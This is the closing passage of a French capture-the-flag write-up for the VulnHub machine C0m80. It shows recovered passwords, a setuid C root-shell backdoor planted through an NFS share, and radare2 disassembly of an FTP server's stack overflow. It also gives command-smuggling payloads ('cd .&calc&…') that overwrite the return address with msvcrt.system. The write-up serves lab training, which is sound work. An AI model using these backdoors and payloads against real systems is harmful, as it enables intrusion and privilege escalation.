Le mot de passe *3mrgnc33mrgnc33mrgnc3* s'avère être celui de bob dédié au MantisBT.  

Cela permet de voir d'autres issues enregistrées, la première traitant clairement de buffer-overflow, Wine et CD.  

Mais la partie vraiment intéressante concerne le fichier *~/.wine/drive\_c/users/b0b/Application Data/Mozilla/Extensions/PWMangr2.html*.  

Il semble que bob se soit écrit un password manager maison en javascript. L'indice d'oubli de mot de passe est *superbuddies* et si on rentre *alice* comme master password on obtient la liste suivante :  

![C0m80 JS password manager](https://raw.githubusercontent.com/devl00p/blog/master/images/c0m80/c0m80_passmngr.png)

Cette fois c'est clair qu'on dispose du password pour se connecter graphiquement. L'autre mot de passe correspond au pass-manager graphique utilisé par bob, ce qui va nous permettre de déchiffrer sa clé privée et de nous connecter sur le compte d'alice (enfin !).  

![c0m80 alice shell](https://raw.githubusercontent.com/devl00p/blog/master/images/c0m80/c0m80_al1ce_shell.png)

Like a déjà vu
--------------

Comme prévu, maintenant que l'on peut accéder au partage NFS, rien de bien compliqué.  

On compile la backdoor locale suivante que l'on place dans le partage avec les droits d'alice:  

```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>

int main(void)
{
  setuid(0);
  setgid(0);
  system("/bin/sh");
  return 0;
}
```

Ensuite on monte le partage NFS en tant que root et on change les permissions :  

```bash
chown root.root g0tr00t
chmod u+s g0tr00t
chmod g+s g0tr00t
```

Ce qui nous permet de récupérer le flag :  

![C0m80 final flag](https://raw.githubusercontent.com/devl00p/blog/master/images/c0m80/c0m80_priv_esc.png)

Je m'en tamponne le dépassement
-------------------------------

Par acquis de conscience on va tout de même jeter un œil au buffer-overflow dans la commande CD.  

```asm
 -- Charlie! We are here.
[0x004014e0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x004014e0]> pd@0x004036e7
            0x004036e7      e858150000     call sym._strncmp           ; int strncmp(const char *s1, const char *s2, size_t n)
            0x004036ec      85c0           test eax, eax
        ,=< 0x004036ee      7423           je 0x403713
        |   0x004036f0      c74424080300.  mov dword [esp + 8], 3
        |   0x004036f8      c7442404cf67.  mov dword [esp + 4], 0x4067cf ; [0x4067cf:4]=0x204443 ; "CD "
        |   0x00403700      8b45d8         mov eax, dword [ebp - 0x28]
        |   0x00403703      890424         mov dword [esp], eax
        |   0x00403706      e839150000     call sym._strncmp           ; int strncmp(const char *s1, const char *s2, size_t n)
        |   0x0040370b      85c0           test eax, eax
       ,==< 0x0040370d      0f8541010000   jne 0x403854
       ||      ; JMP XREF from 0x004036ee (sym._ConnectionHandler_4 + 7195)
       |`-> 0x00403713      c70424640000.  mov dword [esp], 0x64       ; 'd' ; [0x64:4]=-1 ; 100
       |    0x0040371a      e86d150000     call sym._malloc            ;  void *malloc(size_t size)
       |    0x0040371f      8945cc         mov dword [ebp - 0x34], eax
       |    0x00403722      c74424086400.  mov dword [esp + 8], 0x64   ; 'd' ; [0x64:4]=-1 ; 100
       |    0x0040372a      c74424040000.  mov dword [esp + 4], 0
       |    0x00403732      8b45cc         mov eax, dword [ebp - 0x34]
       |    0x00403735      890424         mov dword [esp], eax
       |    0x00403738      e83f150000     call sym._memset            ; void *memset(void *s, int c, size_t n)
       |    0x0040373d      c7850dfbffff.  mov dword [ebp - 0x4f3], 0x20303532
       |    0x00403747      c78511fbffff.  mov dword [ebp - 0x4ef], 0x65726944
       |    0x00403751      c78515fbffff.  mov dword [ebp - 0x4eb], 0x726f7463
       |    0x0040375b      c78519fbffff.  mov dword [ebp - 0x4e7], 0x75732079
       |    0x00403765      c7851dfbffff.  mov dword [ebp - 0x4e3], 0x73656363
       |    0x0040376f      c78521fbffff.  mov dword [ebp - 0x4df], 0x6c756673
       |    0x00403779      c78525fbffff.  mov dword [ebp - 0x4db], 0x6320796c
       |    0x00403783      c78529fbffff.  mov dword [ebp - 0x4d7], 0x676e6168
       |    0x0040378d      c7852dfbffff.  mov dword [ebp - 0x4d3], 0x220a6465
       |    0x00403797      c78531fbffff.  mov dword [ebp - 0x4cf], 0x660a222f
       |    0x004037a1      c78535fbffff.  mov dword [ebp - 0x4cb], 0x3e7074
       |    0x004037ab      8d8539fbffff   lea eax, [ebp - 0x4c7]
       |    0x004037b1      b9cf000000     mov ecx, 0xcf               ; 207
       |    0x004037b6      bb00000000     mov ebx, 0
       |    0x004037bb      8918           mov dword [eax], ebx
       |    0x004037bd      895c08fc       mov dword [eax + ecx - 4], ebx
       |    0x004037c1      8d5004         lea edx, [eax + 4]          ; 4
       |    0x004037c4      83e2fc         and edx, 0xfffffffc
       |    0x004037c7      29d0           sub eax, edx
       |    0x004037c9      01c1           add ecx, eax
       |    0x004037cb      83e1fc         and ecx, 0xfffffffc
       |    0x004037ce      c1e902         shr ecx, 2
       |    0x004037d1      89d7           mov edi, edx
       |    0x004037d3      89d8           mov eax, ebx
       |    0x004037d5      f3ab           rep stosd dword es:[edi], eax
       |    0x004037d7      c745e0020000.  mov dword [ebp - 0x20], 2
       |,=< 0x004037de      eb3a           jmp 0x40381a
       ||      ; JMP XREF from 0x00403820 (sym._ConnectionHandler_4 + 7501)
       ||   0x004037e0      8b55e0         mov edx, dword [ebp - 0x20]
       ||   0x004037e3      8b45d8         mov eax, dword [ebp - 0x28]
       ||   0x004037e6      01d0           add eax, edx
       ||   0x004037e8      0fb600         movzx eax, byte [eax]
       ||   0x004037eb      3c2e           cmp al, 0x2e                ; '.' ; 46
      ,===< 0x004037ed      7527           jne 0x403816
      |||   0x004037ef      c74424086400.  mov dword [esp + 8], 0x64   ; 'd' ; [0x64:4]=-1 ; 100
      |||   0x004037f7      8b45d8         mov eax, dword [ebp - 0x28]
      |||   0x004037fa      89442404       mov dword [esp + 4], eax
      |||   0x004037fe      8b45cc         mov eax, dword [ebp - 0x34]
      |||   0x00403801      890424         mov dword [esp], eax
      |||   0x00403804      e833140000     call sym._strncpy           ; char *strncpy(char *dest, const char *src, size_t  n)
      |||   0x00403809      8b45cc         mov eax, dword [ebp - 0x34]
      |||   0x0040380c      890424         mov dword [esp], eax
      |||   0x0040380f      e8a4e2ffff     call sym._Function1
     ,====< 0x00403814      eb0c           jmp 0x403822
     ||||      ; JMP XREF from 0x004037ed (sym._ConnectionHandler_4 + 7450)
     |`---> 0x00403816      8345e001       add dword [ebp - 0x20], 1
     | ||      ; JMP XREF from 0x004037de (sym._ConnectionHandler_4 + 7435)
     | |`-> 0x0040381a      8b45e0         mov eax, dword [ebp - 0x20]
     | |    0x0040381d      3b45dc         cmp eax, dword [ebp - 0x24]
[0x004014e0]> pdf@sym._Function1
/ (fcn) sym._Function1 27
|   sym._Function1 (int arg_8h);
|           ; var int local_2eh @ ebp-0x2e
|           ; arg int arg_8h @ ebp+0x8
|           ; var int local_4h @ esp+0x4
|              ; CALL XREF from 0x0040380f (sym._ConnectionHandler_4 + 7484)
|           0x00401ab8      55             push ebp
|           0x00401ab9      89e5           mov ebp, esp
|           0x00401abb      83ec48         sub esp, 0x48               ; 'H'
|           0x00401abe      8b4508         mov eax, dword [arg_8h]     ; [0x8:4]=-1 ; 8
|           0x00401ac1      89442404       mov dword [local_4h], eax
|           0x00401ac5      8d45d2         lea eax, [local_2eh]
|           0x00401ac8      890424         mov dword [esp], eax
|           0x00401acb      e884310000     call sym._strcpy            ; char *strcpy(char *dest, const char *src)
|           0x00401ad0      90             nop
|           0x00401ad1      c9             leave
\           0x00401ad2      c3             ret
```

**NOTE: l'exploitation fonctionne ici car juste après l'adresse de retour que l'on écrase se trouve l'adresse de la commande passée (celle stockée sur le heap via recv). L'inconvénient c'est que cette technique nous laisse peu de place pour la commande à exécuter.**  

A l'adresse 0x004036e7 on a le début du traitement des commandes *cd*.  

A 0x004037eb, le code regarde s'il voit le caractère point, ce qui nous fait passer par la partie vulnérable du code.  

Finalement à 0x0040380f, la commande est passée à la fonction locale *sym.\_Function1* qui est un cas d'école de dépassement de tampon sur la pile.  

On a ici 72 (0x48) octets réservés sur la pile, donc l'espace est plutôt restreint.  

Vu que la commande que l'on passe est un peu après l'adresse de ESP, ça vaut le coup de simplement écraser l'adresse de retour par l'adresse de *msvcrt.system()* qui est 0x00404c1c. Plus qu'à croiser les doigts pour que la fonction se débrouille avec les caractères chelous qui peuvent être présents.  

La Structure de la pile ressemble à ça :  

![C0m80 bestFTPServer stack structure before BOF](https://raw.githubusercontent.com/devl00p/blog/master/images/c0m80/c0m80_stack_structure.png)

On commence par faire un test simple en passant la commande suivante :  

```plain
cd .&calc&BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL
```

Ce qui nous vaut une redirection de l'exécution sur 0x4C4C4C4C (ce qui correspond à LLLL) : yes !  

Et avec l'exploit suivant :  

```plain
cd .&calc&BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK\x1c\x4x\x40\x00
```

on écrase avec succès l'adresse de retour :  

![C0m80 bestFTPServer stack structure after BOF](https://raw.githubusercontent.com/devl00p/blog/master/images/c0m80/c0m80_post_bof.png)

PWNED!!!  

![C0m80 bestFTPServer stack overflow exploitation](https://raw.githubusercontent.com/devl00p/blog/master/images/c0m80/c0m80_bof_exploitation.png)

Le reste de l'injection ne semble pas poser de problèmes :  

![C0m80 bestFTPServer stack overflow logs](https://raw.githubusercontent.com/devl00p/blog/master/images/c0m80/c0m80_exec_log.png)

On pourrait faire passer le reste en commentaire batch (::) pour que ce soit plus discret.

Closing credits
---------------

Voilà un CTF qui fait partie des meilleurs que j'ai croisé sur VulnHub avec une bonne difficulté tout en restant fun, merci à [3mrgnc3](https://twitter.com/@3mrgnc3) pour le challenge.

*Published March 04 2018 at 16:23*